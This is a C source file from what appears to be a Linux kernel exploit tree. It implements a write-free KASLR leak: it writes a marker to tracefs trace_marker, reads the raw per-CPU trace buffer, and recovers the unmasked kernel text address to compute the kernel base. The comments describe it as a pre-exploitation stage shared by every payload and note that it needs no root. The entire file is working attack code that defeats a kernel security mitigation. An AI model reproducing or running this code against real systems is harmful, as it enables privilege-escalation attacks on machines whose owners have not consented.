#include "common.h"

/*
 * slide_tracefs.c -- the write-free KASLR text-base leak, shared by every
 * payload in this tree. It is compiled into both the 6.1 and 6.6 GhostLock
 * builds; "common.h" resolves to the variant common.h through each build's
 * include path. Mechanism and per-build offsets: cves/kaslr/README.md.
 */

#ifdef SLIDE_TRACE_MARK_IP_OFF
/*
 * Write-free KASLR leak (cves/kaslr/README.md). No kernel R/W primitive, no
 * fork/futex, no boot_id write -- just tracefs reads, so it can run BEFORE any
 * exploitation stage. Writing to trace_marker makes tracing_mark_write store
 * its own code address (_THIS_IP_ = tracing_mark_write+0x164) into the ring
 * buffer's print_entry.ip; a RAW read of per_cpu/cpu0/trace_pipe_raw returns
 * that pointer unmasked (kptr_restrict only gates %pK, never hit here). Then
 *   stext = leaked_ip - SLIDE_TRACE_MARK_IP_OFF.
 * shell is in gid readtracefs and the raw file shares the label it already
 * reads, so this needs no root.
 */
/* Put tracing_on back the way it was found. Leaving ftrace enabled system-wide
 * changes kernel behaviour for every later stage on this boot. */
static void slide_tracing_restore(int t, int was_off) {
  if (t < 0) {
    return;
  }
  if (was_off) {
    lseek(t, 0, SEEK_SET);
    if (write(t, "0", 1) < 0) { /* best effort */ }
  }
  close(t);
}

int slide_leak_kernel_base_tracefs(void) {
  static const char MK[] = "P0KASLR64PROBE";
  const size_t MKLEN = sizeof(MK) - 1;

  int r = open("/sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw",
               O_RDONLY | O_NONBLOCK | O_CLOEXEC);
  if (r < 0) {
    pr_warning("slide tracefs: open trace_pipe_raw errno=%d\n", errno);
    return 0;
  }

  unsigned char page[8192];
  /* Drain cpu0's (busy) buffer first so our fresh marker lands on top. */
  int drained = 0;
  while (read(r, page, sizeof(page)) > 0 && drained < 8192) {
    drained++;
  }

  /* tracing_mark_write bails with -EBADF if tracing_on == 0; turn it on, and
   * remember whether it had to be turned on so it can be put back. */
  int t = open("/sys/kernel/tracing/tracing_on", O_RDWR | O_CLOEXEC);
  int tracing_was_off = 0;
  if (t >= 0) {
    char c = '0';
    if (read(t, &c, 1) == 1 && c == '0') {
      tracing_was_off = 1;
      lseek(t, 0, SEEK_SET);
      if (write(t, "1", 1) < 0) { /* best effort */ }
    }
  }

  int m = open("/sys/kernel/tracing/trace_marker", O_WRONLY | O_CLOEXEC);
  if (m < 0) {
    pr_warning("slide tracefs: open trace_marker errno=%d\n", errno);
    close(r);
    slide_tracing_restore(t, tracing_was_off);
    return 0;
  }
  if (write(m, MK, MKLEN) < 0) {
    pr_warning("slide tracefs: write marker errno=%d\n", errno);
    close(m); close(r); slide_tracing_restore(t, tracing_was_off);
    return 0;
  }

  uint64_t stext = 0;
  for (int tries = 0; tries < 400 && !stext; tries++) {
    ssize_t n = read(r, page, sizeof(page));
    if (n <= 0) { usleep(1000); continue; }
    for (ssize_t i = 0; i + (ssize_t)MKLEN <= n; i++) {
      if (memcmp(page + i, MK, MKLEN) != 0) continue;
      if (i >= 8) {
        uint64_t ip;
        memcpy(&ip, page + i - 8, 8);
        /* sanity: a slid kernel-text pointer whose low 12 bits are the fixed
         * page offset of tracing_mark_write+0x164. */
        if ((ip >> 40) == 0xffffffULL &&
            (ip & 0xfffULL) == (SLIDE_TRACE_MARK_IP_OFF & 0xfffULL)) {
          stext = ip - SLIDE_TRACE_MARK_IP_OFF;
        } else {
          pr_warning("slide tracefs: ip=%016llx failed sanity\n",
                     (unsigned long long)ip);
        }
      }
      break;
    }
  }

  close(m); close(r); slide_tracing_restore(t, tracing_was_off);
  if (!stext) {
    pr_warning("slide tracefs: marker/ip not found (drained=%d)\n", drained);
    return 0;
  }
  kslide_set(&kernel_slide, stext, SLIDE_LEAKED);
  pr_success("slide-kaslr-tracefs-ok pid=%d base=%016llx slide=%016llx "
             "(write-free)\n",
             getpid(), (unsigned long long)kernel_slide.base,
             (unsigned long long)kernel_slide.slide);
  return 1;
}
#endif /* SLIDE_TRACE_MARK_IP_OFF */
